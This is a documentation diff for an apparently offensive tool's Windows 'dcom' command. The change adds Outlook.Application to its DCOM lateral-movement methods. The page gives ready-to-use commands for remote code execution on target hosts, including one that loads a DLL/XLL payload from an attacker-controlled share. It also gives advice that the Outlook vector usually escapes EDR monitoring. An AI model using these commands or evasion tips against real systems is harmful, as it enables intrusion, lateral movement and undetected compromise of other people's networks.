@@ -7,7 +7,7 @@ hidden = false
 
 ## Summary
 
-Execute commands on remote hosts via DCOM (Distributed Component Object Model) lateral movement. Creates COM objects on remote machines using `CoCreateInstanceEx` and invokes shell execution methods. Five DCOM objects supported: MMC20.Application, ShellWindows, ShellBrowserWindow, WScript.Shell, and Excel.Application. No subprocess spawning.
+Execute commands on remote hosts via DCOM (Distributed Component Object Model) lateral movement. Creates COM objects on remote machines using `CoCreateInstanceEx` and invokes shell execution methods. Six DCOM objects supported: MMC20.Application, ShellWindows, ShellBrowserWindow, WScript.Shell, Excel.Application, and Outlook.Application.
 
 {{% notice info %}}Windows Only{{% /notice %}}
 
@@ -17,7 +17,7 @@ Execute commands on remote hosts via DCOM (Distributed Component Object Model) l
 |----------|----------|---------|-------------|
 | action | Yes | exec | Action: `exec` |
 | host | Yes | - | Target hostname or IP address |
-| object | No | mmc20 | DCOM object: `mmc20`, `shellwindows`, `shellbrowser`, `wscript`, `excel` |
+| object | No | mmc20 | DCOM object: `mmc20`, `shellwindows`, `shellbrowser`, `wscript`, `excel`, `outlook` |
 | command | Yes | - | Command or program to execute |
 | args | No | - | Arguments to pass to the command |
 | dir | No | C:\Windows\System32 | Working directory on the target |
@@ -76,6 +76,12 @@ dcom -action exec -host 192.168.1.50 -object excel -command "\\\\attacker\\share
 ```
 Loads a DLL/XLL into the Excel.exe process on the target. Stealthier — payload lives inside the Office process. Command must end in `.xll` or `.dll` to trigger RegisterXLL mode.
 
+### Execute via Outlook.Application
+```
+dcom -action exec -host 192.168.1.50 -object outlook -command "cmd.exe" -args "/c whoami > C:\temp\out.txt"
+```
+Uses `Outlook.Application.CreateObject("Wscript.Shell").Run`. Command executes inside `OUTLOOK.EXE` process context. Unusual vector — EDR tools typically don't monitor Outlook for shell execution. Requires Outlook installed on target. May be blocked by Outlook's programmatic access security settings.
+
 ## Example Output
 
 ### Successful Execution
@@ -109,6 +115,7 @@ Failed to create MMC20.Application on 192.168.1.50: CoCreateInstanceEx failed: H
   - `shellbrowser`: May not work on Windows 10+ (CLSID restricted in newer versions)
   - `wscript`: WScript.Shell.Run — less commonly monitored, good fallback when MMC is blocked
   - `excel`: Requires Excel installed. Two modes: commands → DDEInitiate, .dll/.xll files → RegisterXLL (payload lives in Excel process)
+  - `outlook`: Requires Outlook installed. Uses CreateObject("Wscript.Shell") inside Outlook — command runs within OUTLOOK.EXE. Often not monitored by EDR. May be blocked by Outlook's programmatic access security settings.
 - **Opsec**: DCOM execution creates processes on the target under the authenticated user's context. Event ID 4624 (logon type 3) will be generated. Process creation events (4688) will show the executed command.
 
 ## Common HRESULT Errors
